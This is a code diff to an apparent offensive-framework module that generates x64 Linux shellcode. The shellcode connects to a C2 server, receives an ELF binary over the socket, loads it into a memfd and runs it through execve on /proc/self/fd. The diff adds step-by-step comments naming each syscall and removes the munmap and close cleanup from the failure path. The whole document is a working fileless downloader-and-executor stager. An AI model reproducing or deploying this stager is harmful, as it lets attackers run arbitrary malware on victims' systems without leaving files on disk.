@@ -23,13 +23,19 @@ class PawnModule(Module, Socket, Assembler):
                 'Tomas Globis (Tomasglgg) - payload developer'
             ],
             'Architecture': "x64",
-            'Platform': "linux"
+            'Platform': "linux",
+            'Requires': ['size']
         }
 
     def run(self, host: str, port: int, bind: bool = False,
             length: Optional[int] = None, reliable: bool = True) -> bytes:
         payload = dedent("""\
             start:
+                /*
+                 * Set up socket for further communication with C2
+                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
+                 */
+
                 push 0x29
                 pop rax
                 cdq
@@ -46,6 +52,11 @@ class PawnModule(Module, Socket, Assembler):
             host = self.pack_host(host)
 
             payload += dedent(f"""\
+                    /*
+                     * Connect to the C2 server
+                     * connect(rdi, {{sa_family=AF_INET, sin_port=htons(port), sin_addr=inet_addr(host)}}, 16)
+                    */
+
                     xchg rdi, rax
                     movabs rcx, 0x{host.hex()}{port.hex()}0002
                     push rcx
@@ -72,11 +83,18 @@ class PawnModule(Module, Socket, Assembler):
 
         if length:
             payload += dedent(f"""\
+                    /* Push hardcoded ELF length if provided */
+
                     push 0x{length.to_bytes(8, 'little').hex()}
             """)
 
         else:
             payload += dedent(f"""\
+                    /*
+                     * Read ELF length from socket
+                     * read(rdi, rsi, 8)
+                     */
+
                     push 0x8
                     pop rdx
                     push 0x0
@@ -86,9 +104,16 @@ class PawnModule(Module, Socket, Assembler):
             """)
 
         payload += dedent("""\
+                /* Save length to r12 and socket descriptor to r13 */
+
                 pop r12
                 push rdi
                 pop r13
+
+                /*
+                 * Create file descriptor for ELF file
+                 * memfd_create("", 0)
+                 */
 
                 xor rax, rax
                 push rax
@@ -100,8 +125,15 @@ class PawnModule(Module, Socket, Assembler):
                 xor rsi, rsi
                 syscall
 
+                /* Save file descriptor to r14 */
+
                 push rax
                 pop r14
+
+                /*
+                 * Allocate memory space for ELF file
+                 * mmap(NULL, r12, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
+                 */
 
                 push 0x9
                 pop rax
@@ -115,6 +147,8 @@ class PawnModule(Module, Socket, Assembler):
                 pop r10
                 syscall
 
+                /* Save address to the allocated memory space to r15 */
+
                 push rax
                 pop r15
         """)
@@ -126,6 +160,11 @@ class PawnModule(Module, Socket, Assembler):
             """)
 
         payload += dedent(f"""\
+                /*
+                 * Read ELF file from socket
+                 * recvfrom(r13, r15, r12, MSG_WAITALL, NULL, 0);
+                 */
+
                 push 0x2d
                 pop rax
                 push r13
@@ -138,6 +177,11 @@ class PawnModule(Module, Socket, Assembler):
                 pop r10
                 syscall
 
+                /*
+                 * Write read ELF file data to the file descriptor
+                 * write(r14, r15, r12)
+                 */
+
                 push 0x1
                 pop rax
                 push r14
@@ -145,6 +189,12 @@ class PawnModule(Module, Socket, Assembler):
                 push r12
                 pop rdx
                 syscall
+
+                /*
+                 * Routine below is written by Tomas Globis (Tomasglgg)
+                 * It concatenates two parts, first one is /proc/self/fd/
+                 * second is out file descriptor
+                 */
 
                 add rsp, 16
                 mov qword ptr [rsp], 0x6f72702f
@@ -178,6 +228,11 @@ class PawnModule(Module, Socket, Assembler):
                 jnz convert_loop
 
             end:
+                /*
+                 * Execute ELF file from file descriptor
+                 * execve(/proc/self/fd/..., [], [])
+                 */
+
                 lea rdi, [rsp]
                 push 0x3b
                 pop rax
@@ -191,23 +246,10 @@ class PawnModule(Module, Socket, Assembler):
         if reliable:
             payload += dedent("""\
                 fail:
-                    push 0xb
-                    pop rax
-                    push r15
-                    pop rdi
-                    push r12
-                    pop rsi
-                    syscall
-
-                    push 0x3
-                    pop rax
-                    push r14
-                    pop rdi
-                    syscall
-
-                    push r13
-                    pop rdi
-                    syscall
+                    /*
+                     * Exit in case of failure
+                     * exit(0)
+                     */
 
                     push 0x3c
                     pop rax
